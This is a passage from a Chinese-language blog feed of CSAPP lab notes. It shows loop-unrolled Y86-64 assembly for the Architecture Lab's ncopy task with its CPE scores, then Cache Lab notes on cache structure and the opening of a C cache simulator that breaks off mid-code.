class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">##################################################################</span><br><span class="hljs-comment"># You can modify this portion</span><br><span class="hljs-comment"># Loop header</span><br><span class="hljs-comment"># xorq %rax,%rax# count = 0; 不需要初始化 rax本来就是0</span><br>jmp Test1<br><br>Loop:              <span class="hljs-comment"># len不够k  普通循环</span><br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rdi</span><span class="hljs-comment"># src++</span><br>rmmovq <span class="hljs-variable">%r10</span>, (<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rsi</span><span class="hljs-comment"># dst++</span><br>iaddq <span class="hljs-variable">$-</span><span class="hljs-number">1</span>,<span class="hljs-variable">%rdx</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle RET1<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>RET1:<br>andq <span class="hljs-variable">%rdx</span>,<span class="hljs-variable">%rdx</span><span class="hljs-comment"># len &gt; 0?</span><br>jg Loop<span class="hljs-comment"># if so, goto Loop:</span><br>ret<br><br><span class="hljs-comment">#循环展开</span><br>Loop1:<br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...                   #消除气泡 引入额外的寄存器</span><br>mrmovq <span class="hljs-number">8</span>(<span class="hljs-variable">%rdi</span>),<span class="hljs-variable">%r9</span>  <br>rmmovq <span class="hljs-variable">%r10</span>, (<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>rmmovq <span class="hljs-variable">%r9</span>, <span class="hljs-number">8</span>(<span class="hljs-variable">%rsi</span>)<br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop2<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop2:<br>andq <span class="hljs-variable">%r9</span>, <span class="hljs-variable">%r9</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop3<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop3:<br>mrmovq <span class="hljs-number">16</span>(<span class="hljs-variable">%rdi</span>), <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>mrmovq <span class="hljs-number">24</span>(<span class="hljs-variable">%rdi</span>),<span class="hljs-variable">%r9</span>  <br>rmmovq <span class="hljs-variable">%r10</span>, <span class="hljs-number">16</span>(<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>rmmovq <span class="hljs-variable">%r9</span>, <span class="hljs-number">24</span>(<span class="hljs-variable">%rsi</span>)<br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop4<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop4:<br>andq <span class="hljs-variable">%r9</span>, <span class="hljs-variable">%r9</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop5<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop5:<br>mrmovq <span class="hljs-number">32</span>(<span class="hljs-variable">%rdi</span>), <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...  </span><br>mrmovq <span class="hljs-number">40</span>(<span class="hljs-variable">%rdi</span>),<span class="hljs-variable">%r9</span>   <br>rmmovq <span class="hljs-variable">%r10</span>, <span class="hljs-number">32</span>(<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>rmmovq <span class="hljs-variable">%r9</span>, <span class="hljs-number">40</span>(<span class="hljs-variable">%rsi</span>)<br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop6<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop6:<br>iaddq <span class="hljs-variable">$4</span>8,<span class="hljs-variable">%rdi</span><br>iaddq <span class="hljs-variable">$4</span>8,<span class="hljs-variable">%rsi</span><br>andq <span class="hljs-variable">%r9</span>, <span class="hljs-variable">%r9</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Test1<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br><br>Test1:                       <span class="hljs-comment">#循环展开的判断</span><br>iaddq <span class="hljs-variable">$-</span><span class="hljs-number">6</span>,<span class="hljs-variable">%rdx</span><br>jge Loop1   <span class="hljs-comment"># len&gt;=k  k路循环展开</span><br>iaddq <span class="hljs-variable">$6</span>,<span class="hljs-variable">%rdx</span><br>jg Loop <br>jle Done<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Average</span> CPE     <span class="hljs-number">8</span>.<span class="hljs-number">24</span><br><span class="hljs-attribute">Score</span>   <span class="hljs-number">45</span>.<span class="hljs-number">2</span>/<span class="hljs-number">60</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h5 id="剩余数据处理"><a href="#剩余数据处理" class="headerlink" title="剩余数据处理"></a>剩余数据处理</h5><p>6路循环时 剩余数据的情况是0 1 2 3 4 5</p><p>先分为大于等于3个 和小于3个 </p><p>对于大于等于3：  3路循环</p><p>小于3个： 分三种情况处理</p> <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">##################################################################</span><br><span class="hljs-comment"># You can modify this portion</span><br><span class="hljs-comment"># Loop header</span><br><span class="hljs-comment"># xorq %rax,%rax# count = 0; 不需要初始化 rax本来就是0</span><br>jmp Test1<br><br><br><span class="hljs-comment">#循环展开</span><br>Loop1:<br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src... </span><br>mrmovq <span class="hljs-number">8</span>(<span class="hljs-variable">%rdi</span>),<span class="hljs-variable">%r9</span>  <br>rmmovq <span class="hljs-variable">%r10</span>, (<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>rmmovq <span class="hljs-variable">%r9</span>, <span class="hljs-number">8</span>(<span class="hljs-variable">%rsi</span>)<br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop2<br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop2:<br>andq <span class="hljs-variable">%r9</span>, <span class="hljs-variable">%r9</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop3<br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop3:<br>mrmovq <span class="hljs-number">16</span>(<span class="hljs-variable">%rdi</span>), <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>mrmovq <span class="hljs-number">24</span>(<span class="hljs-variable">%rdi</span>),<span class="hljs-variable">%r9</span>  <br>rmmovq <span class="hljs-variable">%r10</span>, <span class="hljs-number">16</span>(<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>rmmovq <span class="hljs-variable">%r9</span>, <span class="hljs-number">24</span>(<span class="hljs-variable">%rsi</span>)<br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop4<br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop4:<br>andq <span class="hljs-variable">%r9</span>, <span class="hljs-variable">%r9</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop5<br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop5:<br>mrmovq <span class="hljs-number">32</span>(<span class="hljs-variable">%rdi</span>), <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...  </span><br>mrmovq <span class="hljs-number">40</span>(<span class="hljs-variable">%rdi</span>),<span class="hljs-variable">%r9</span>   <br>rmmovq <span class="hljs-variable">%r10</span>, <span class="hljs-number">32</span>(<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>rmmovq <span class="hljs-variable">%r9</span>, <span class="hljs-number">40</span>(<span class="hljs-variable">%rsi</span>)<br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop6<br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop6:<br>iaddq <span class="hljs-variable">$4</span>8,<span class="hljs-variable">%rdi</span><br>iaddq <span class="hljs-variable">$4</span>8,<span class="hljs-variable">%rsi</span><br>andq <span class="hljs-variable">%r9</span>, <span class="hljs-variable">%r9</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Test1<br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br><br>Test1:                       <span class="hljs-comment">#循环展开的判断</span><br>iaddq <span class="hljs-variable">$-</span><span class="hljs-number">6</span>,<span class="hljs-variable">%rdx</span><br>jge Loop1   <span class="hljs-comment"># len&gt;=k  k路循环展开</span><br><br><span class="hljs-comment"># rdx: 0 1 2 |  3 4 5</span><br><span class="hljs-comment">#-6 : -6 -5 -4 -3 -2 -1  Test</span><br><span class="hljs-comment">#+3 : -3 -2 -1 0 1 2    Remain</span><br>Remain:       <span class="hljs-comment">#二分 len&lt;k</span><br>iaddq <span class="hljs-variable">$3</span>,<span class="hljs-variable">%rdx</span>           <span class="hljs-comment">#len-6+3&gt;=0 -&gt; len&gt;=3</span><br>jge Right       <span class="hljs-comment">#len&gt;=3?               </span><br><br><span class="hljs-comment"># -3 -2 -1</span><br><span class="hljs-comment"># +2 : -1 0 1</span><br>Left:      <span class="hljs-comment"># len&lt;=2 </span><br>iaddq <span class="hljs-variable">$2</span>,<span class="hljs-variable">%rdx</span>       <br>jl Done               <span class="hljs-comment">#len==0</span><br>je L1            <span class="hljs-comment">#len==1</span><br>jg L2<span class="hljs-comment"># len==2 ?</span><br><br>L1:        <span class="hljs-comment">#len==1</span><br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>,<span class="hljs-variable">%r8</span><br>rmmovq <span class="hljs-variable">%r8</span>,(<span class="hljs-variable">%rsi</span>)<br>andq <span class="hljs-variable">%r8</span>,<span class="hljs-variable">%r8</span>    <span class="hljs-comment"># val &lt;= 0?</span><br>jle Done  <br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>ret<br>L2:    <span class="hljs-comment">#len==2</span><br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>,<span class="hljs-variable">%r8</span><br>mrmovq <span class="hljs-number">8</span>(<span class="hljs-variable">%rdi</span>),<span class="hljs-variable">%r9</span><br>rmmovq <span class="hljs-variable">%r8</span>,(<span class="hljs-variable">%rsi</span>)<br>rmmovq <span class="hljs-variable">%r9</span>,<span class="hljs-number">8</span>(<span class="hljs-variable">%rsi</span>)<br>andq <span class="hljs-variable">%r8</span>,<span class="hljs-variable">%r8</span>    <span class="hljs-comment"># val &lt;= 0?</span><br>jle L21  <br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>L21: andq <span class="hljs-variable">%r9</span>,<span class="hljs-variable">%r9</span><br>jle Done <br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>ret<br><br>Right:     <span class="hljs-comment">#len&gt;=3</span><br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>,<span class="hljs-variable">%r8</span><br>mrmovq <span class="hljs-number">8</span>(<span class="hljs-variable">%rdi</span>),<span class="hljs-variable">%r9</span><br>mrmovq <span class="hljs-number">16</span>(<span class="hljs-variable">%rdi</span>),<span class="hljs-variable">%r10</span><br>rmmovq <span class="hljs-variable">%r8</span>,(<span class="hljs-variable">%rsi</span>)<br>rmmovq <span class="hljs-variable">%r9</span>,<span class="hljs-number">8</span>(<span class="hljs-variable">%rsi</span>)<br>rmmovq <span class="hljs-variable">%r10</span>,<span class="hljs-number">16</span>(<span class="hljs-variable">%rsi</span>)<br>iaddq <span class="hljs-variable">$2</span>4,<span class="hljs-variable">%rdi</span><br>iaddq <span class="hljs-variable">$2</span>4,<span class="hljs-variable">%rsi</span><br>iaddq <span class="hljs-variable">$-</span><span class="hljs-number">3</span>,<span class="hljs-variable">%rdx</span> <br>andq <span class="hljs-variable">%r8</span>,<span class="hljs-variable">%r8</span>    <span class="hljs-comment"># val &lt;= 0?</span><br>jle R1   <span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>R1: andq <span class="hljs-variable">%r9</span>,<span class="hljs-variable">%r9</span><br>jle R2  <span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>R2: andq <span class="hljs-variable">%r10</span>,<span class="hljs-variable">%r10</span><br>jle Left <span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>jmp Left<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Average</span> CPE     <span class="hljs-number">7</span>.<span class="hljs-number">86</span><br><span class="hljs-attribute">Score</span>   <span class="hljs-number">52</span>.<span class="hljs-number">8</span>/<span class="hljs-number">60</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/480380496">CSAPP | Lab4-Architecture Lab 深入解析 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/61151313">通俗解说CSAPP的archlab partC - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/project/2025/05/24/csapp/5,cache_lab/"/>
    <url>/project/2025/05/24/csapp/5,cache_lab/</url>
    
    <content type="html"><![CDATA[<h2 id="PART-A-模拟cache"><a href="#PART-A-模拟cache" class="headerlink" title="PART A 模拟cache"></a>PART A 模拟cache</h2><h3 id="hints"><a href="#hints" class="headerlink" title="hints"></a>hints</h3><ul><li>从小的做起  traces&#x2F;dave.trace</li><li>实现参数 -v 显示每次内存访问(memory access)的结果(hit miss eviction)，便于debug</li><li>使用getopt函数 解析命令行参数 <code>man 3 getopt</code></li><li>L(load) S(store)可导致最多一次miss 而M(modify)相当于一次load和同地址store，可导致2次hit，或1个miss和1个hit(可能还多一个eviction)</li><li>使用malloc函数，对任意s、E、b参数进行模拟</li><li>忽略I(instruction cache access)</li><li>默认内存访问时数据对齐的</li></ul><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>编写csim.c  得到和<code>csim-ref</code>得到相同的结果，csim-ref采用LRU替换策略（替换访问时间最久远的块）</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="cache结构"><a href="#cache结构" class="headerlink" title="cache结构"></a>cache结构</h4><p><img src="/project/./image/5,cache_lab_image/image-20240724153911733.png" alt="image-20240724153911733"><br>$$<br>共S&#x3D;2^s组(cacheset)，每组E个高速缓存行(cacheline) ，每行的B&#x3D;2^b个字节，称为B字节的数据块（block)<br>$$<br>每行有一个数据块，还一些标记位<img src="/project/./image/5,cache_lab_image/image-20240729120316505.png" alt="image-20240729120316505"></p><p>cache的结构是S*E个block，使用四元组（S，E，b，m）可确定一个cache；</p><p>数据总是以块为单位在层与层之间传递，当某个地址不命中时，该地址所在的块都会被存储到高一级的缓存中</p><p>在缓存中，每个行除了块之外，还有t位的标记位和额外的有效位</p><p><img src="/project/./image/5,cache_lab_image/image-20240724154827214.png" alt="image-20240724154827214"></p><h4 id="cache的块是如何查找定位的"><a href="#cache的块是如何查找定位的" class="headerlink" title="cache的块是如何查找定位的"></a>cache的块是如何查找定位的</h4><p>&#x3D;&#x3D;如何确定给定地址的字（ 64位机字长64位，即一次取出64位的数据进行处理）是否在高速缓存中呢？&#x3D;&#x3D;</p><p>m位地址被参数S和B分为三段，其中s位的组索引和b位的块偏移由上图可以理解，对于一片连续的内存，如果其t和s位相同，则会被放入同一个块中。也即，若块的的大小为B，则连续的大小为B的内存会被放入同一块中。</p><p>问题是一个组可能有多个行，如何确定该字在哪一行呢：利用标记位t来确定。当cache中对应组的标记位和地址中标记为相同时，即为命中；若不命中，则需要替换cache在该组的某一行的块；具体替换哪一行由替换策略决定</p><h3 id="编写csim-c"><a href="#编写csim-c" class="headerlink" title="编写csim.c"></a>编写csim.c</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">Usage: ./csim-ref [-hv] -s <span class="hljs-symbol">&lt;s&gt;</span> -E <span class="hljs-symbol">&lt;E&gt;</span> -<span class="hljs-keyword">b</span> <span class="hljs-symbol">&lt;b&gt;</span> -t <span class="hljs-symbol">&lt;tracefile&gt;</span><br>• -h: Optional <span class="hljs-keyword">help</span> flag that prints usage info<br>• -v: Optional <span class="hljs-keyword">verbose</span> flag that displays trace info<br>• -s <span class="hljs-symbol">&lt;s&gt;</span>: Number of <span class="hljs-keyword">set</span> <span class="hljs-built_in">index</span> bits (S = <span class="hljs-number">2</span>s <span class="hljs-keyword">is</span> the <span class="hljs-keyword">number</span> of sets)<br>• -E <span class="hljs-symbol">&lt;E&gt;</span>: Associativity (<span class="hljs-keyword">number</span> of lines per <span class="hljs-keyword">set</span>)<br>• -<span class="hljs-keyword">b</span> <span class="hljs-symbol">&lt;b&gt;</span>: Number of block bits (B = <span class="hljs-number">2</span><span class="hljs-keyword">b</span> <span class="hljs-keyword">is</span> the block size)<br>• -t <span class="hljs-symbol">&lt;tracefile&gt;</span>: Name of the valgrind trace <span class="hljs-keyword">to</span> replay<br></code></pre></td></tr></table></figure><h4 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h4><ul><li><p>主要是getopt实现命令解析</p></li><li><p>逐行处理trace文件，并提取地址，计算其标志位，组索引</p></li><li><p>模拟一个随着内存访问次数增多而变大的时间变量，用于实现LRU替换</p></li><li><p>模拟hit miss eviction的过程，在malloc申请的空间中查询cache的块匹配情况</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _XOPEN_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;getopt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cachelab.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 1024</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">char2int</span><span class="hljs-params">(<span class="hljs-type">char</span> c)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span>* argv[])</span><br>&#123;<br>    <span class="hljs-type">int</span> s=<span class="hljs-number">0</span>,E=<span class="hljs-number">0</span>,b=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> debug=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> S=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//int B=0;</span><br>    <span class="hljs-type">char</span> *trace_file;<br>    <span class="hljs-type">char</span> *usage=<span class="hljs-string">&quot;Usage: ./csim [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt; \n\</span><br><span class="hljs-string">                -h: Optional help flag that prints usage info \n\</span><br><span class="hljs-string">                -v: Optional verbose flag that displays trace info \n\</span><br><span class="hljs-string">                -s &lt;s&gt;: Number of set index bits (S = 2s is the number of sets) \n\</span><br><span class="hljs-string">                -E &lt;E&gt;: Associativity (number of lines per set) \n\</span><br><span class="hljs-string">                -b &lt;b&gt;: Number of block bits (B = 2b is the block size) \n\</span><br><span class="hljs-string">                -t &lt;tracefile&gt;: Name of the valgrind trace to replay\n&quot;</span> ;<br>    <span class="hljs-comment">//解析命令</span><br>    <span class="hljs-comment">//加冒号的是必选 getopt自带全局变量optarg</span><br>    <span class="hljs-type">int</span> opt=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>((opt=getopt(argc,argv,<span class="hljs-string">&quot;hvs:E:b:t:&quot;</span>))!=<span class="hljs-number">-1</span>)&#123;<br>        <span 